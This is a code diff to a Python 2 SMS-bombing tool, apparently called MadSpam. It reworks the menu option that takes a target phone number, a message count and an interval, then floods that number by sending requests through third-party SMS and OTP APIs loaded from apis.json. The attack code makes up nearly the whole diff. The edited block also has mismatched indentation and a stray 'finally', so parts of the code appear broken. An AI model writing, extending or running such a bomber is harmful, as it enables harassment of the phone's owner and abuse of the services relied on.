@@ -125,66 +125,75 @@ while True:
         except KeyboardInterrupt:
             raw_input("\nAttack suspended. Press Enter to return to the menu...")
 
-    if x == "2":
-          os.system("clear")
+    if x == "2":  
+          os.system("clear")  
 
-    def send(num, counter, sleep):
-        with open("apis.json", "r") as f:
-            data = json.load(f)
-         
-        api_list = []
-        for lst in data["sms"].values():
-            api_list.extend(lst)
-         
-        if not api_list:
-            print("No APIs found in apis.json")
-            return
+          # Get inputs first
+          print(Fore.CYAN + MadSpam)  
+          print(Fore.RED + barrier)  
+          number = raw_input("Enter Target Number: ")  
+          count = raw_input("Enter number of SMS Messages: ")  
+          throttle = raw_input("Enter time interval: ")  
 
-        for i in range(counter):
-              for api in api_list:
-                     try:
-                            api_url = api.get("url", "")
-                            method = api.get("method", "").upper()
-                            data = api.get("data", {})
-                            headers = api.get("headers", {})
-                          
-                            def replace(obj):
-                                if isinstance(obj, dict):
-                                    return {k: replace(v) for k, v in obj.items()}
-                                if isinstance(obj, str):
-                                    return obj.replace("{target}", num)
-                                else:
-                                    return obj
-                            
-                            data = replace(data)
-                            headers = replace(headers)
+    def send(num, counter, sleep):  
+        with open("apis.json", "r") as f:  
+            data = json.load(f)  
+           
+        api_list = []  
+        for lst in data["sms"].values():  
+            api_list.extend(lst)  
+           
+        if not api_list:  
+            print("No APIs found in apis.json")  
+            return  
 
-                            if method == "GET":
-                                if data:
-                                    api_url += "?" + urllib.urlencode(data)
-                                req = urllib2.Request(api_url, headers=headers)
-                                urllib2.urlopen(req)
-                            if method == "POST":
-                               post_data = urllib.urlencode(data) if data else None
-                               req = urllib2.Request(api_url, data=post_data, headers=headers)
-                               urllib2.urlopen(req)
+        for i in range(counter):  
+              for api in api_list:  
+                     try:  
+                            api_url = api.get("url", "")  
+                            method = api.get("method", "").upper()  
+                            data_field = api.get("data", {})  
+                            params_field = api.get("params", {})  
+                            json_field = api.get("json", {})  
+                            headers = api.get("headers", {})  
 
-                            print("Message sent! (Attempt {})".format(i+1))
-                            break  # One success = stop trying APIs for this attempt
-                     except Exception:
-                         print("API failed:", api.get("name", "unknown"), "->", e)
-                         continue  # Try next API if failed
-                     time.sleep(sleep)
+                            def replace(obj):  
+                                if isinstance(obj, dict):  
+                                    return {k: replace(v) for k, v in obj.items()}  
+                                if isinstance(obj, str):  
+                                    return obj.replace("{target}", num)  
+                                else:  
+                                    return obj  
 
-    try:
-        print(Fore.CYAN + MadSpam)
-        print(Fore.RED + barrier)
-        number = raw_input("Enter Target Number: ")
-        count = raw_input("Enter number of SMS Messages: ")
-        throttle = raw_input("Enter time interval: ")
-        send(number, int(count), int(throttle))
-        raw_input("Press Enter to return to menu...")
-    finally:
+                            data_field = replace(data_field)  
+                            params_field = replace(params_field)  
+                            json_field = replace(json_field)  
+                            headers = replace(headers)  
+
+                            if method == "GET":  
+                                if params_field:  
+                                    api_url += "?" + urllib.urlencode(params_field)  
+                                req = urllib2.Request(api_url, headers=headers)  
+                                urllib2.urlopen(req)  
+                            elif method == "POST":  
+                               if json_field:  
+                                   post_data = json.dumps(json_field)  
+                                   headers['Content-Type'] = 'application/json'  
+                               else:  
+                                   post_data = urllib.urlencode(data_field) if data_field else None  
+                               req = urllib2.Request(api_url, data=post_data, headers=headers)  
+                               urllib2.urlopen(req)  
+
+                            print("Message sent! (Attempt {}) via {}".format(i+1, api.get("name", "unknown")))  
+                            break  # One success = stop trying APIs for this attempt  
+                     except Exception as e:  
+                         print("API failed:", api.get("name", "unknown"), "->", repr(e))  
+                         continue  # Try next API if failed  
+                     time.sleep(sleep)  
+
+          send(number, int(count), int(throttle))  
+          raw_input("Press Enter to return to menu...")  
+    finally:  
         pass
 
     if x == "3":
